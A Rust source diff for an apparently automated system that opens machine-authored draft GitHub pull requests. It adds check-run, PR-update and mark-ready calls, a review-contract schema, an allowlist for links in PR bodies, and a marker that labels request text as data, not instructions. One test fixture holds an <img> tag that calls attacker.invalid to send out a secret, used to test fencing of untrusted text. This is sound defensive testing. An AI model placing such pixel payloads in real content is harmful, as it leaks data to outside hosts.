@@ -54,6 +54,7 @@ impl RepositoryScope {
 pub enum TokenPurpose {
     Publish,
     Reconcile,
+    Lifecycle,
 }
 
 impl TokenPurpose {
@@ -62,10 +63,17 @@ impl TokenPurpose {
             Self::Publish => GitHubPermissions {
                 contents: PermissionLevel::Write,
                 pull_requests: PermissionLevel::Write,
+                checks: None,
             },
             Self::Reconcile => GitHubPermissions {
                 contents: PermissionLevel::Read,
                 pull_requests: PermissionLevel::Read,
+                checks: None,
+            },
+            Self::Lifecycle => GitHubPermissions {
+                contents: PermissionLevel::Read,
+                pull_requests: PermissionLevel::Write,
+                checks: Some(PermissionLevel::Read),
             },
         }
     }
@@ -82,6 +90,8 @@ enum PermissionLevel {
 struct GitHubPermissions {
     contents: PermissionLevel,
     pull_requests: PermissionLevel,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    checks: Option<PermissionLevel>,
 }
 
 #[derive(Clone, Debug)]
@@ -112,8 +122,10 @@ impl BotIdentity {
 #[derive(Clone, Debug, Deserialize, Eq, PartialEq)]
 pub struct PullRequest {
     pub number: i32,
+    pub node_id: String,
     pub draft: bool,
     pub state: String,
+    pub body: Option<String>,
     pub html_url: String,
     pub head: PullRequestRef,
     pub base: PullRequestRef,
@@ -167,6 +179,22 @@ pub struct OpenPullRequestSnapshot {
     pub pull_requests: Vec<PullRequest>,
 }
 
+#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
+pub struct CheckRun {
+    pub id: u64,
+    pub name: String,
+    pub head_sha: String,
+    pub status: String,
+    pub conclusion: Option<String>,
+    pub details_url: String,
+}
+
+#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
+pub struct CheckRuns {
+    pub total_count: usize,
+    pub check_runs: Vec<CheckRun>,
+}
+
 pub type GitHubFuture<'a, T> = Pin<Box<dyn Future<Output = Result<T, GitHubError>> + Send + 'a>>;
 pub type PublisherFuture<'a> =
     Pin<Box<dyn Future<Output = Result<PublishedPullRequest, PublisherError>> + Send + 'a>>;
@@ -202,6 +230,44 @@ pub trait GitHubApi: Send + Sync {
         request: &'a CreatePullRequest,
         cancellation: &'a CancellationToken,
     ) -> GitHubFuture<'a, PullRequest>;
+
+    fn check_runs<'a>(
+        &'a self,
+        _token: &'a InstallationToken,
+        _repository: &'a RepositoryScope,
+        _head_sha: &'a str,
+        _cancellation: &'a CancellationToken,
+    ) -> GitHubFuture<'a, CheckRuns> {
+        Box::pin(async { Err(GitHubError::InvalidConfig("check-runs API unavailable")) })
+    }
+
+    fn update_pull_request_body<'a>(
+        &'a self,
+        _token: &'a InstallationToken,
+        _repository: &'a RepositoryScope,
+        _number: i32,
+        _body: &'a str,
+        _cancellation: &'a CancellationToken,
+    ) -> GitHubFuture<'a, PullRequest> {
+        Box::pin(async {
+            Err(GitHubError::InvalidConfig(
+                "pull-request update API unavailable",
+            ))
+        })
+    }
+
+    fn mark_pull_request_ready<'a>(
+        &'a self,
+        _token: &'a InstallationToken,
+        _pull_request_node_id: &'a str,
+        _cancellation: &'a CancellationToken,
+    ) -> GitHubFuture<'a, ()> {
+        Box::pin(async {
+            Err(GitHubError::InvalidConfig(
+                "ready-for-review API unavailable",
+            ))
+        })
+    }
 
     fn reviews<'a>(
         &'a self,
@@ -596,6 +662,111 @@ impl GitHubApi for GhGitHub {
         })
     }
 
+    fn check_runs<'a>(
+        &'a self,
+        token: &'a InstallationToken,
+        repository: &'a RepositoryScope,
+        head_sha: &'a str,
+        cancellation: &'a CancellationToken,
+    ) -> GitHubFuture<'a, CheckRuns> {
+        Box::pin(async move {
+            validate_git_sha("check-runs head", head_sha)
+                .map_err(|_| GitHubError::InvalidConfig("check-runs head"))?;
+            self.gh_json(
+                token.expose(),
+                "GET",
+                format!(
+                    "repos/{}/commits/{head_sha}/check-runs",
+                    repository.full_name()
+                ),
+                &[
+                    ("filter".to_owned(), "latest".to_owned()),
+                    ("per_page".to_owned(), "100".to_owned()),
+                ],
+                None,
+                cancellation,
+            )
+            .await
+        })
+    }
+
+    fn update_pull_request_body<'a>(
+        &'a self,
+        token: &'a InstallationToken,
+        repository: &'a RepositoryScope,
+        number: i32,
+        body: &'a str,
+        cancellation: &'a CancellationToken,
+    ) -> GitHubFuture<'a, PullRequest> {
+        Box::pin(async move {
+            if number <= 0 {
+                return Err(GitHubError::InvalidConfig("pull request number"));
+            }
+            validate_pr_body(body).map_err(|_| GitHubError::InvalidConfig("pull request body"))?;
+            let input = PrivateInput::create(
+                &self.config.scratch,
+                "github-update-pr",
+                serde_json::to_vec(&serde_json::json!({"body": body}))?,
+            )
+            .await?;
+            let result = self
+                .gh_json(
+                    token.expose(),
+                    "PATCH",
+                    format!("repos/{}/pulls/{number}", repository.full_name()),
+                    &[],
+                    Some(input.path()),
+                    cancellation,
+                )
+                .await;
+            let cleanup = input.close().await;
+            match (result, cleanup) {
+                (Ok(pull), Ok(())) => Ok(pull),
+                (Err(error), Ok(())) => Err(error),
+                (_, Err(error)) => Err(error),
+            }
+        })
+    }
+
+    fn mark_pull_request_ready<'a>(
+        &'a self,
+        token: &'a InstallationToken,
+        pull_request_node_id: &'a str,
+        cancellation: &'a CancellationToken,
+    ) -> GitHubFuture<'a, ()> {
+        Box::pin(async move {
+            validate_label("pull request node ID", pull_request_node_id, 256)
+                .map_err(|_| GitHubError::InvalidConfig("pull request node ID"))?;
+            let response: MarkReadyResponse = self
+                .gh_json(
+                    token.expose(),
+                    "POST",
+                    "graphql".to_owned(),
+                    &[
+                        (
+                            "query".to_owned(),
+                            "mutation($pullRequestId:ID!){markPullRequestReadyForReview(input:{pullRequestId:$pullRequestId}){pullRequest{id isDraft}}}".to_owned(),
+                        ),
+                        (
+                            "pullRequestId".to_owned(),
+                            pull_request_node_id.to_owned(),
+                        ),
+                    ],
+                    None,
+                    cancellation,
+                )
+                .await?;
+            let ready_pull = response
+                .data
+                .mark_pull_request_ready_for_review
+                .pull_request;
+            if ready_pull.id != pull_request_node_id || ready_pull.is_draft {
+                return Err(GitHubError::MalformedResponse("ready-for-review mutation"));
+            }
+            Ok(())
+        })
+    }
+
     fn reviews<'a>(
         &'a self,
         token: &'a InstallationToken,
@@ -661,6 +832,30 @@ struct MintRepository {
     full_name: String,
 }
 
+#[derive(Debug, Deserialize)]
+struct MarkReadyResponse {
+    data: MarkReadyData,
+}
+
+#[derive(Debug, Deserialize)]
+#[serde(rename_all = "camelCase")]
+struct MarkReadyData {
+    mark_pull_request_ready_for_review: MarkReadyPayload,
+}
+
+#[derive(Debug, Deserialize)]
+#[serde(rename_all = "camelCase")]
+struct MarkReadyPayload {
+    pull_request: MarkReadyPullRequest,
+}
+
+#[derive(Debug, Deserialize)]
+#[serde(rename_all = "camelCase")]
+struct MarkReadyPullRequest {
+    id: String,
+    is_draft: bool,
+}
+
 fn validate_mint_response(
     response: &MintResponse,
     repository: &RepositoryScope,
@@ -686,6 +881,9 @@ fn validate_mint_response(
     // GitHub always adds metadata:read to an installation token. No other
     // implicit permission is accepted.
     expected.insert("metadata".to_owned(), "read".to_owned());
+    if let Some(checks) = requested.checks {
+        expected.insert("checks".to_owned(), permission_name(checks).to_owned());
+    }
     if response.permissions != expected {
         return Err(GitHubError::UnsafeTokenScope);
     }
@@ -723,6 +921,76 @@ pub enum CrashPoint {
 
 #[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
 #[serde(deny_unknown_fields)]
+pub struct RootCause {
+    pub path: String,
+    pub line: u32,
+    pub cause: String,
+}
+
+#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
+#[serde(deny_unknown_fields)]
+pub struct ReviewContract {
+    pub request_source: String,
+    pub verbatim_request: String,
+    pub lane: String,
+    pub rubric_version: String,
+    pub root_causes: Vec<RootCause>,
+    pub named_assumptions: Vec<String>,
+    pub risk: String,
+    pub rollback: String,
+    pub draft_reply: String,
+    pub reviewer_quiz: Vec<String>,
+    pub shared_function_touched: bool,
+    pub explain_diff: Option<String>,
+}
+
+impl ReviewContract {
+    fn validate(&self) -> Result<(), PublisherError> {
+        validate_label("request source", &self.request_source, 256)?;
+        if self.verbatim_request.trim().is_empty()
+            || self.verbatim_request.len() > 30_000
+            || self.verbatim_request.contains('\0')
+            || self.lane != "A"
+        {
+            return Err(PublisherError::InvalidInput("review request contract"));
+        }
+        validate_label("rubric version", &self.rubric_version, 64)?;
+        if self.root_causes.is_empty()
+            || self.root_causes.len() > 8
+            || self.named_assumptions.is_empty()
+            || self.named_assumptions.len() > 8
+            || !(1..=2).contains(&self.reviewer_quiz.len())
+            || self.shared_function_touched != self.explain_diff.is_some()
+        {
+            return Err(PublisherError::InvalidInput("review contract shape"));
+        }
+        let mut paths = std::collections::BTreeSet::new();
+        for root in &self.root_causes {
+            validate_repo_path(&root.path)?;
+            if root.line == 0
+                || !paths.insert(&root.path)
+                || !safe_contract_prose(&root.cause, 1_000)
+            {
+                return Err(PublisherError::InvalidInput("root cause"));
+            }
+        }
+        for value in self
+            .named_assumptions
+            .iter()
+            .chain([&self.risk, &self.rollback, &self.draft_reply])
+            .chain(self.reviewer_quiz.iter())
+            .chain(self.explain_diff.iter())
+        {
+            if !safe_contract_prose(value, 2_000) {
+                return Err(PublisherError::InvalidInput("review contract prose"));
+            }
+        }
+        Ok(())
+    }
+}
+
+#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
+#[serde(deny_unknown_fields)]
 pub struct PublishInput {
     pub schema_version: u16,
     pub request_id: Uuid,
@@ -735,11 +1003,12 @@ pub struct PublishInput {
     pub expected_tree_hash: String,
     pub title: String,
     pub body: String,
+    pub review_contract: ReviewContract,
 }
 
 impl PublishInput {
     pub fn validate(&self) -> Result<(), PublisherError> {
-        if self.schema_version != 1 {
+        if self.schema_version != 2 {
             return Err(PublisherError::InvalidInput("schema version"));
         }
         if !(1..=2).contains(&self.attempts) {
@@ -751,6 +1020,7 @@ impl PublishInput {
         validate_branch(&self.branch)?;
         validate_title(&self.title)?;
         validate_pr_body(&self.body)?;
+        self.review_contract.validate()?;
         if self.patch_relative_path.starts_with('/')
             || self
                 .patch_relative_path
@@ -1696,42 +1966,182 @@ pub struct CreatePullRequest {
     draft: bool,
 }
 
-pub fn build_pr_body(
+#[derive(Clone, Debug, Eq, PartialEq)]
+pub struct EvidenceLink {
+    pub label: String,
+    pub run_id: Uuid,
+    pub name: String,
+    pub sha256: String,
+}
+
+pub fn build_initial_pr_body(
     request_id: Uuid,
-    source: &str,
-    untrusted_request: &str,
+    contract: &ReviewContract,
     base_sha: &str,
     expected_tree_hash: &str,
     patch_sha256: &str,
 ) -> Result<String, PublisherError> {
-    validate_label("request source", source, 256)?;
+    contract.validate()?;
     validate_git_sha("base SHA", base_sha)?;
     validate_sha256("tree hash", expected_tree_hash)?;
     validate_sha256("patch digest", patch_sha256)?;
-    let source = bounded_excerpt(source, 256);
-    let excerpt = bounded_excerpt(untrusted_request, 2_000);
-    let request_data = format!("Source label: {source}\n\nRequest body:\n{excerpt}");
+    let request_data = format!(
+        "Source label: {}\n\nRequest body:\n{}",
+        contract.request_source, contract.verbatim_request
+    );
     let fence = code_fence(&request_data);
+    let body = render_contract(
+        request_id,
+        contract,
+        base_sha,
+        expected_tree_hash,
+        patch_sha256,
+        &fence,
+        &request_data,
+        "GitHub CI and isolated browser evidence are pending. This draft must not be reviewed yet.",
+        None,
+    );
+    validate_pr_body(&body)?;
+    Ok(body)
+}
+
+#[allow(clippy::too_many_arguments)]
+pub fn build_final_pr_body(
+    request_id: Uuid,
+    contract: &ReviewContract,
+    base_sha: &str,
+    head_sha: &str,
+    expected_tree_hash: &str,
+    patch_sha256: &str,
+    evidence: &[EvidenceLink],
+) -> Result<String, PublisherError> {
+    contract.validate()?;
+    validate_git_sha("base SHA", base_sha)?;
+    validate_git_sha("head SHA", head_sha)?;
+    validate_sha256("tree hash", expected_tree_hash)?;
+    validate_sha256("patch digest", patch_sha256)?;
+    if evidence.len() < 4 || evidence.len() > 16 {
+        return Err(PublisherError::InvalidInput("evidence link count"));
+    }
+    let mut names = std::collections::BTreeSet::new();
+    let mut evidence_lines = String::new();
+    for item in evidence {
+        if !safe_contract_prose(&item.label, 128)
+            || !safe_artifact_name(&item.name)
+            || !names.insert(item.name.clone())
+        {
+            return Err(PublisherError::InvalidInput("evidence link"));
+        }
+        validate_sha256("evidence digest", &item.sha256)?;
+        use std::fmt::Write as _;
+        writeln!(
+            evidence_lines,
+            "- [{}](https://factory.example.com/evidence/{}/{}) - SHA-256 `{}`",
+            item.label, item.run_id, item.name, item.sha256
+        )
+        .expect("write to String");
+    }
+    let ci_link = format!(
+        "[GitHub CI at exact head](https://github.com/example-org/fieldbook/commit/{head_sha}/checks)"
+    );
+    let evidence_section =
+        format!("{ci_link}\n\nCI completed successfully at `{head_sha}`.\n\n{evidence_lines}");
+    let request_data = format!(
+        "Source label: {}\n\nRequest body:\n{}",
+        contract.request_source, contract.verbatim_request
+    );
+    let fence = code_fence(&request_data);
+    let body = render_contract(
+        request_id,
+        contract,
+        base_sha,
+        expected_tree_hash,
+        patch_sha256,
+        &fence,
+        &request_data,
+        &evidence_section,
+        Some(head_sha),
+    );
+    validate_pr_body(&body)?;
+    Ok(body)
+}
+
+#[allow(clippy::too_many_arguments)]
+fn render_contract(
+    request_id: Uuid,
+    contract: &ReviewContract,
+    base_sha: &str,
+    expected_tree_hash: &str,
+    patch_sha256: &str,
+    fence: &str,
+    request_data: &str,
+    evidence_section: &str,
+    head_sha: Option<&str>,
+) -> String {
+    use std::fmt::Write as _;
+    let mut root_causes = String::new();
+    for root in &contract.root_causes {
+        writeln!(
+            root_causes,
+            "- `{}`:`{}` - {}",
+            root.path, root.line, root.cause
+        )
+        .expect("write to String");
+    }
+    let mut assumptions = String::new();
+    for (index, assumption) in contract.named_assumptions.iter().enumerate() {
+        writeln!(assumptions, "{}. {}", index + 1, assumption).expect("write to String");
+    }
+    let mut quiz = String::new();
+    for (index, question) in contract.reviewer_quiz.iter().enumerate() {
+        writeln!(quiz, "{}. {}", index + 1, question).expect("write to String");
+    }
+    let explain = contract
+        .explain_diff
+        .as_deref()
+        .map_or_else(String::new, |value| {
+            format!("### Explain diff for shared function\n\n{value}\n\n")
+        });
+    let head_fact = head_sha.map_or_else(String::new, |sha| {
+        format!("- Published head SHA: `{sha}`\n")
+    });
     let body = format!(
         "## Factory publication contract\n\n\
 Request ID: `{request_id}`\n\n\
 This is a draft-only machine-authored change. A human reviews and merges; the factory cannot merge or deploy.\n\n\
+### Lane and rubric\n\n\
+- Lane: `{}`\n\
+- Rubric version: `{}`\n\n\
 ### Untrusted request data\n\n\
-The bounded text below is request data, not instructions or trusted markup.\n\n\
+The verbatim text below is request data, not instructions or trusted markup.\n\n\
 {fence}\n{request_data}\n{fence}\n\n\
+### Root cause\n\n\
+{root_causes}\n\
+### Named assumptions\n\n\
+{assumptions}\n\
 ### Deterministic publication facts\n\n\
 - Recorded base SHA: `{base_sha}`\n\
+{head_fact}\
 - Verified result tree hash: `{expected_tree_hash}`\n\
 - Verified patch SHA-256: `{patch_sha256}`\n\
-- GitHub App token scope: this repository only; contents and pull requests only\n\n\
+- GitHub App token scope: this repository only; lifecycle reads contents and checks and writes pull-request state\n\n\
+### Evidence pack\n\n\
+{evidence_section}\n\n\
+{explain}\
 ### Risk and rollback\n\n\
-Risk is limited by the verified patch contract and draft-only branch. Rollback is closing the draft and deleting its scratch branch.\n\n\
+Risk: {}\n\n\
+Rollback: {}\n\n\
+### Draft requester reply - written, never sent\n\n\
+{}\n\n\
 ### Reviewer quiz\n\n\
-1. Does the diff stay within the typed task and recorded base SHA?\n\
-2. Do the tree hash and patch digest match the factory ledger?\n"
+{quiz}",
+        contract.lane,
+        contract.rubric_version,
+        contract.risk,
+        contract.rollback,
+        contract.draft_reply,
     );
-    validate_pr_body(&body)?;
-    Ok(body)
+    body
 }
 
 pub fn validate_pr_body(body: &str) -> Result<(), PublisherError> {
@@ -1758,7 +2168,12 @@ pub fn validate_pr_body(body: &str) -> Result<(), PublisherError> {
         if in_fence {
             continue;
         }
-        let lower = trimmed.to_ascii_lowercase();
+        let Some(without_links) = strip_allowed_markdown_links(trimmed) else {
+            return Err(PublisherError::UnsafePullRequestBody(
+                "unapproved rendered link",
+            ));
+        };
+        let lower = without_links.to_ascii_lowercase();
         if lower.contains("<img")
             || lower.contains("<image")
             || lower.contains("<a")
@@ -1782,6 +2197,85 @@ pub fn validate_pr_body(body: &str) -> Result<(), PublisherError> {
     Ok(())
 }
 
+fn strip_allowed_markdown_links(line: &str) -> Option<String> {
+    let mut remainder = line;
+    let mut clean = String::with_capacity(line.len());
+    while let Some(marker) = remainder.find("](") {
+        let label_start = remainder[..marker].rfind('[')?;
+        clean.push_str(&remainder[..label_start]);
+        let target_start = marker + 2;
+        let target_end = remainder[target_start..].find(')')? + target_start;
+        let label = &remainder[label_start + 1..marker];
+        let target = &remainder[target_start..target_end];
+        if label.is_empty() || label.contains(['[', ']', '\r', '\n']) || !allowed_pr_link(target) {
+            return None;
+        }
+        clean.push_str(label);
+        remainder = &remainder[target_end + 1..];
+    }
+    clean.push_str(remainder);
+    Some(clean)
+}
+
+fn allowed_pr_link(target: &str) -> bool {
+    if let Some(path) = target.strip_prefix("https://factory.example.com/evidence/") {
+        let mut components = path.split('/');
+        let run = components.next().unwrap_or_default();
+        let name = components.next().unwrap_or_default();
+        return components.next().is_none()
+            && run.parse::<Uuid>().is_ok()
+            && safe_artifact_name(name);
+    }
+    if let Some(path) =
+        target.strip_prefix("https://github.com/example-org/fieldbook/commit/")
+    {
+        return path
+            .strip_suffix("/checks")
+            .is_some_and(|sha| sha.len() == 40 && lower_hex(sha));
+    }
+    false
+}
+
+fn safe_artifact_name(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 128
+        && !matches!(value, "." | "..")
+        && value
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
+}
+
+fn validate_repo_path(path: &str) -> Result<(), PublisherError> {
+    if path.is_empty()
+        || path.len() > 512
+        || path.starts_with('/')
+        || path
+            .split('/')
+            .any(|part| part.is_empty() || matches!(part, "." | ".."))
+        || !path
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'/' | b'-'))
+    {
+        return Err(PublisherError::InvalidInput("root-cause path"));
+    }
+    Ok(())
+}
+
+fn safe_contract_prose(value: &str, maximum: usize) -> bool {
+    !value.trim().is_empty()
+        && value.len() <= maximum
+        && !value.chars().any(char::is_control)
+        && !value.contains(['`', '[', ']', '<', '>'])
+        && !value.to_ascii_lowercase().contains("http")
+        && !value.contains("](")
+}
+
+fn lower_hex(value: &str) -> bool {
+    value
+        .bytes()
+        .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
+}
+
 pub fn has_head_approval(reviews: &[Review], head_sha: &str) -> bool {
     let mut latest: HashMap<&str, (&Review, OffsetDateTime)> = HashMap::new();
     for review in reviews.iter().filter(|review| review.commit_id == head_sha) {
@@ -1800,20 +2294,6 @@ pub fn has_head_approval(reviews: &[Review], head_sha: &str) -> bool {
     latest
         .values()
         .any(|(review, _)| review.state.eq_ignore_ascii_case("APPROVED"))
-}
-
-fn bounded_excerpt(value: &str, maximum: usize) -> String {
-    if value.len() <= maximum {
-        return value.to_owned();
-    }
-    let mut end = maximum;
-    while !value.is_char_boundary(end) {
-        end -= 1;
-    }
-    format!(
-        "{}\n[truncated; full request remains in the authenticated factory ledger]",
-        &value[..end]
-    )
 }
 
 fn code_fence(value: &str) -> String {
@@ -2147,16 +2627,19 @@ mod tests {
         BotIdentity, CrashPoint, CreatePullRequest, GitHubApi, GitHubError, GitHubFuture,
         GitHubPermissions, GitHubUser, InstallationToken, MintRepository, MintResponse,
         OpenPullRequestSnapshot, PermissionLevel, PublishInput, Publisher, PublisherConfig,
-        PublisherError, PullRequest, PullRequestRef, RepositoryScope, Review, TokenPurpose,
-        build_pr_body, has_head_approval, validate_mint_response, validate_pr_body,
+        PublisherError, PullRequest, PullRequestRef, RepositoryScope, Review, ReviewContract,
+        RootCause, TokenPurpose, build_initial_pr_body, has_head_approval, validate_mint_response,
+        validate_pr_body,
     };
 
     #[test]
     fn pr_body_fences_untrusted_phishing_text() {
-        let body = build_pr_body(
+        let mut contract = review_contract();
+        contract.verbatim_request =
+            "```html\n<img src=\"https://attacker.invalid/pixel?secret=x\">\n```".to_owned();
+        let body = build_initial_pr_body(
             Uuid::nil(),
-            "fixture",
-            "```html\n<img src=\"https://attacker.invalid/pixel?secret=x\">\n```",
+            &contract,
             &"a".repeat(40),
             &"b".repeat(64),
             &"c".repeat(64),
@@ -2213,6 +2696,7 @@ mod tests {
         let requested = GitHubPermissions {
             contents: PermissionLevel::Write,
             pull_requests: PermissionLevel::Write,
+            checks: None,
         };
         let exact = MintResponse {
             token: "secret".to_owned(),
@@ -2599,8 +3083,9 @@ mod tests {
         }
 
         fn input(&self, request_id: Uuid, run_id: Uuid) -> PublishInput {
+            let review_contract = review_contract();
             PublishInput {
-                schema_version: 1,
+                schema_version: 2,
                 request_id,
                 run_id,
                 attempts: 1,
@@ -2610,15 +3095,15 @@ mod tests {
                 patch_sha256: self.patch_sha256.clone(),
                 expected_tree_hash: self.result_tree_hash.clone(),
                 title: format!("Factory fixture request {request_id}"),
-                body: build_pr_body(
+                body: build_initial_pr_body(
                     request_id,
-                    "fixture",
-                    "alphabetize fixture",
+                    &review_contract,
                     &self.base_sha,
                     &self.result_tree_hash,
                     &self.patch_sha256,
                 )
                 .expect("body"),
+                review_contract,
             }
         }
     }
@@ -2780,8 +3265,10 @@ mod tests {
     fn pull(number: i32, branch: &str, sha: &str, author: &str) -> PullRequest {
         PullRequest {
             number,
+            node_id: format!("PR_{number}"),
             draft: true,
             state: "open".to_owned(),
+            body: None,
             html_url: format!("https://github.invalid/pull/{number}"),
             head: PullRequestRef {
                 branch: branch.to_owned(),
@@ -2800,6 +3287,27 @@ mod tests {
             merged_at: None,
             merge_commit_sha: None,
             merged_by: None,
+        }
+    }
+
+    fn review_contract() -> ReviewContract {
+        ReviewContract {
+            request_source: "fixture form".to_owned(),
+            verbatim_request: "ALPHABETIZE fixture".to_owned(),
+            lane: "A".to_owned(),
+            rubric_version: "factory-rubric-v1".to_owned(),
+            root_causes: vec![RootCause {
+                path: "names.txt".to_owned(),
+                line: 1,
+                cause: "The fixture entries are out of order.".to_owned(),
+            }],
+            named_assumptions: vec!["The requested scope is limited to names.txt.".to_owned()],
+            risk: "A missed entry could remain out of order.".to_owned(),
+            rollback: "Revert the factory commit.".to_owned(),
+            draft_reply: "Alphabetized names.txt and attached evidence for review.".to_owned(),
+            reviewer_quiz: vec!["Does the resulting order match the request?".to_owned()],
+            shared_function_touched: false,
+            explain_diff: None,
         }
     }
 
